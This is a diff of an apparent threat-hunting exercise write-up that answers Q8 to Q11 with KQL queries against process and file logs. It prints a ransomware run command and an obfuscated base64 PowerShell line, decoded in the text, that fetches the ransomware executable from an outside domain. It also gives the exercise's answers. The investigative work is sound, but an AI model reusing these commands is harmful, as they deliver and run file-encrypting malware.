@@ -72,16 +72,47 @@ From previous question.<br><br>
 **Answer: umadbro**<br><br>
 
 **Q8. What command was run that references the ransomware extension?**<br><br>
-**Answer: **<br><br>
+From question 6.<br><br>
 
-**Q9. **<br><br>
-**Answer: **<br><br>
+**Answer: start /b C:\\ProgramData\\files_go_byebye.exe -encrypt -target C:\\Users\\ -ext .umadbro**<br><br>
 
-**Q10. **<br><br>
-**Answer: **<br><br>
+**Q9. When did files_go_byebye.exe appear on this machine?**<br><br>
 
-**Q11. **<br><br>
-**Answer: **<br><br>
+```
+FileCreationEvents
+| where hostname == "UL8R-MACHINE"
+| where path contains "files_go_byebye.exe"
+```
+<br>
+
+**Answer: 2/17/2024, 2:30:50 AM**<br><br>
+
+**Q10. How many commands were run on UL8R-MACHINE during this timeframe?**<br><br>
+
+```
+ProcessEvents
+| where hostname == "UL8R-MACHINE"
+| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
+```
+<br>
+
+**Answer: 23**<br><br>
+
+**Q11. There's a base64 encoded powershell command run in this time window. What domain does the encoded PowerShell reference?**<br><br>
+From the previous query, there is a result at 2/17/2024, 2:29:53 AM that contains Base64 string.<br>
+
+```
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc cG93ZXJzaGVsbCAtYyAiSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vbm90aWZpY2F0aW9uLWZpbmFuY2Utc2VydmljZXMuY29tL2ZpbGVzX2dvX2J5ZWJ5ZS5leGUgLU91dEZpbGUgQzpcXFByb2dyYW1EYXRhXFxmaWxlc19nb19ieWVieWUuZXhlIg==
+```
+<br>
+Pass the string after '-enc' into Cyberchef and select From Base64. The output is:<br><br>
+
+```
+powershell -c "Invoke-WebRequest -Uri http://notification-finance-services.com/files_go_byebye.exe -OutFile C:\\ProgramData\\files_go_byebye.exe"
+```
+<br>
+
+**Answer: notification-finance-services.com**<br><br>
 
 **Q12. **<br><br>
 **Answer: **<br><br>
